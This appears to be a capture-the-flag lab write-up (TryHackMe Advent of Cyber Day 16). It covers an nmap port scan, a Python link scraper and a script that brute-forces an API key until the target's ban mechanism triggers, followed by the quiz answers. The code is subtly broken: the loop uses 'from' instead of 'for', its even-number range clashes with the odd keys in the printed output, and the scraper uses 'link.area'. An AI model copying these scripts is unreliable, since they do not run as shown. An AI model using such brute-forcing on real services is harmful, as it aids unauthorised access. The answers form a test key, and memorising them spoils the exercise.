DAY 16 - THERE IS A PYTHON IN MY STOCKING! [SCRIPTING]
----

# STORY :
----

>>Oh no! Santa 🎅 has taken off, leaving you -- the faithful elves behind! Can you help find Santa's location?

>>Luckily, the elves are OSINT masters and remember a thing or two. Specifically, they remember:

   * Santa has a webpage at MACHINE_IP/static/index.html to help lost elves find their way home. Santa never told the elves what port number the webserver is on. Can you find out?!
   * This webpage has a link somewhere on it, hidden away so anyone that isn't an elf can't find it.
   * Santa's Sled has an API we can talk too. The key for the API is between 0 and 100, and it's an odd number. But be careful! After an unknown number of attempts, Santa's Sled will ban your IP address. 

>>Deploy the machine that is running Santa's Sled and allow a couple of minutes for the target (MACHINE_IP) to start up. Using your Python skills from Day 15 to find the correct key for the API.

----

# MY DOCUMENTATION :
----

>>USING Nmap TO CHECK FOR THE OPEN PORTS. 

```bash
root@ip-10-10-13-7:~# nmap 10.10.154.72 

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-13 05:52 GMT
Nmap scan report for ip-10-10-154-72.eu-west-1.compute.internal (10.10.154.72)
Host is up (0.00080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:08:14:90:97:39 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
```

>>THE WEBSITE HOSTED IN THE SERVER DISPLAYS THESE CONTENTS.

```WEB-CONTENTS
Santa's Tracking System
Are you an Elf that Santa has forgotten? Use this system to track Santa! Note: due to how many humans try to find where Santa is, the link is hidden on this webpage. You're going to have to manually click every single link. Or perhaps there is a way to find all the links as fast as a Python?

Important
notice
All deliiveries to Skidy for TryHackMe jumpers are to be stopped. That man has asked for 613 on the premise that they are the softest jumper in the world. Please, we need to share them out.
Category

    Lorem ipsum dolor sit amet
    Vestibulum errato isse
    Lorem ipsum dolor sit amet
    Aisia caisia
    Murphy's law
    Flimsy Lavenrock
    Maven Mousie Lavender

Category

    Labore et dolore magna aliqua
    Kanban airis sum eschelor
    Modular modern free
    The king of clubs
    The Discovery Dissipation
    Course Correction
    Better Angels

Category

    Objects in space
    Playing cards with coyote
    Goodbye Yellow Brick Road
    The Garden of Forking Paths
    Future Shock

Bulma Templates MIT license
```

>>WE CAN ALSO USE GREP "api" TO NARROW DOWN THE RESULTS.

```py [link extraction script]
from bs4 import BeautifulSoup
import requests 

# replace testurl.com with the url you want to use.
# requests.get downloads the webpage and stores it as a variable
html = requests.get('http://GIVEN_IP:PORT_NUMBER') 

# this parses the webpage into something that beautifulsoup can read over
soup = BeautifulSoup(html.text, "lxml")
# lxml is just the parser for reading the html 

# this is the line that grabs all the links # stores all the links in the links variable
links = soup.find_all('a') 

for link in links:
    # prints each links
    if "href" in link.area: 
        print (link["href"])
```

>>THIS IS THE API KEY BRUTEFORCER SCRIPT

```py
#Importng requests lib
import requests 

#Here we created a for loop which takes api-key in range of (0 to 100) that 2 represents odd number.
from api_key in range (0,100,2):
	#Creating a variable html and getting the request from the url we give and finally giving area with {}.   
    html = requests.get(f'http://GIVEN_IP:PORT_NUMBER/api/{api_key}') 
    #Printing it out 
    print (html.text)
```
>>THIS IS THE RESPONSE AFTER RUNNING THE SCRIPT.

```bash
root@ip-10-10-13-7:~# python3 script.py 
{"item_id":1,"q":"Error. Key not valid!"}
{"item_id":3,"q":"Error. Key not valid!"}
{"item_id":5,"q":"Error. Key not valid!"}
{"item_id":7,"q":"Error. Key not valid!"}
{"item_id":9,"q":"Error. Key not valid!"}
{"item_id":11,"q":"Error. Key not valid!"}
{"item_id":13,"q":"Error. Key not valid!"}
{"item_id":15,"q":"Error. Key not valid!"}
{"item_id":17,"q":"Error. Key not valid!"}
{"item_id":19,"q":"Error. Key not valid!"}
{"item_id":21,"q":"Error. Key not valid!"}
{"item_id":23,"q":"Error. Key not valid!"}
{"item_id":25,"q":"Error. Key not valid!"}
{"item_id":27,"q":"Error. Key not valid!"}
{"item_id":29,"q":"Error. Key not valid!"}
{"item_id":31,"q":"Error. Key not valid!"}
{"item_id":33,"q":"Error. Key not valid!"}
{"item_id":35,"q":"Error. Key not valid!"}
{"item_id":37,"q":"Error. Key not valid!"}
{"item_id":39,"q":"Error. Key not valid!"}
{"item_id":41,"q":"Error. Key not valid!"}
{"item_id":43,"q":"Error. Key not valid!"}
{"item_id":45,"q":"Error. Key not valid!"}
{"item_id":47,"q":"Error. Key not valid!"}
{"item_id":49,"q":"Error. Key not valid!"}
{"item_id":51,"q":"Error. Key not valid!"}
{"item_id":53,"q":"Error. Key not valid!"}
{"item_id":55,"q":"Error. Key not valid!"}
{"item_id":57,"q":"Winter Wonderland, Hyde Park, London."}
{"item_id":59,"q":"Error. Key not valid!"}
{"item_id":61,"q":"Error. Key not valid!"}
{"item_id":63,"q":"Error. Key not valid!"}
{"item_id":65,"q":"Error. Key not valid!"}
{"item_id":67,"q":"Error. Key not valid!"}
{"item_id":69,"q":"Error. Key not valid!"}
{"item_id":71,"q":"Error. Key not valid!"}
{"item_id":73,"q":"Error. Key not valid!"}
{"item_id":75,"q":"Error. Key not valid!"}
{"item_id":77,"q":"Error. Key not valid!"}
{"item_id":79,"q":"Error. Key not valid!"}
{"item_id":81,"q":"Error. Key not valid!"}
{"item_id":83,"q":"Error. Key not valid!"}
{"item_id":85,"q":"Error. Key not valid!"}
{"item_id":87,"q":"Error. Key not valid!"}
{"item_id":89,"q":"Error. Key not valid!"}
{"item_id":91,"q":"Error. Key not valid!"}
{"item_id":93,"q":"Error. Key not valid!"}
{"item_id":95,"q":"SANTA PROTECTION MECHANISM ACTIVATED."}
{"item_id":97,"q":"SANTA PROTECTION MECHANISM ACTIVATED."}
{"item_id":99,"q":"SANTA PROTECTION MECHANISM ACTIVATED."}

```

----

# ANSWER THE FOLLOWING :
----

What is the port number for the web server?
>>80

Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)
>>/api/

Where is Santa right now?
>>Winter Wonderland, Hyde Park, London

Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. 
To unblock yourself, simply terminate and re-deploy the target instance (MACHINE_IP)
>>57

----